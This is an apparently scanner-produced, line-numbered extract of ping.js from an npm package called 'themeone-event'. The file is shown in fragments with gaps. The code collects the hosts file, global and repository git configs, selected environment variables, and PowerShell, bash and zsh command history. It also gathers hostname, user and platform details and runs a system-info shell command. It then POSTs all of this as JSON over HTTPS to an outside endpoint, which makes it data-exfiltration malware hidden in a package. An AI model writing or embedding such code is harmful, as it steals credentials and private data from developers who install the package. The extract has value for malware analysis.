// File: tmp/tmpg7lhwct7/themeone-event/package/ping.js
// ======================================================================
Line 1: const https = require('https')
Line 2: const os = require('os')
Line 3: const path = require('path')
Line 4: const fs = require('fs')
Line 5: _tmp_11 = require('child_process')
Line 9: {
  const payload = JSON.stringify(data);

  const options = {
    hostname: endpoint,
    port: 443,
    path: '/',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    }
  };

  const req = https.request(options, res => {
    // Optionally handle response
  });

  req.on('error', error => {
    // Optionally log error
  });

  req.write(payload);
  req.end();
}
Line 23: const req = https.request(options, res => {
    // Optionally handle response
  })
Line 31: req.write(payload)
Line 32: req.end()
Line 36: os.platform()
Line 37: path.join(process.env.SystemRoot || 'C:\\Windows', 'System32', 'drivers', 'etc', 'hosts')
Line 42: (_tmp_2 = fs.readFileSync(hostsPath, 'utf8'))
Line 53: path.join(home, '.gitconfig')
Line 55: configs.global = fs.readFileSync(globalGitConfig, 'utf8').slice(0, 3000)
Line 61: path.join(cwd, '.git', 'config')
Line 63: configs.local = fs.readFileSync(localGitConfig, 'utf8').slice(0, 3000)
Line 73: Object.keys(process.env)
Line 82: {
    suspicious[k] = process.env[k];
  }
Line 83: suspicious[k] = process.env[k]
Line 92: {
      // Powershell history (current session)
      const powershellHistoryPath = path.join(home, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'PowerShell', 'PSReadline', 'ConsoleHost_history.txt');
      if (fs.existsSync(powershellHistoryPath)) {
        return fs.readFileSync(powershellHistoryPath, 'utf8').slice(-2000); // last 2000 chars
      }
    }
Line 94: const powershellHistoryPath = path.join(home, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'PowerShell', 'PSReadline', 'ConsoleHost_history.txt')
Line 95: fs.existsSync(powershellHistoryPath)
Line 96: (_tmp_8 = fs.readFileSync(powershellHistoryPath, 'utf8')).slice
Line 100: path.join(home, '.bash_history')
Line 102: (_tmp_9 = fs.readFileSync(bashHistoryPath, 'utf8'))
Line 105: path.join(home, '.zsh_history')
Line 107: (_tmp_10 = fs.readFileSync(zshHistoryPath, 'utf8'))
Line 115: os.hostname()
Line 116: os.userInfo()
Line 117: os.platform()
Line 118: os.arch()
Line 122: getHostsFile()
Line 123: getGitConfig()
Line 124: getSuspiciousEnv()
Line 128: os.platform()
Line 133: exec(cmd, (error, stdout, stderr) => {
  send({
    ...baseData,
    systeminfo: error ? stderr || 'command failed' : stdout
  });
})
Line 134: send({
    ...baseData,
    systeminfo: error ? stderr || 'command failed' : stdout
  })
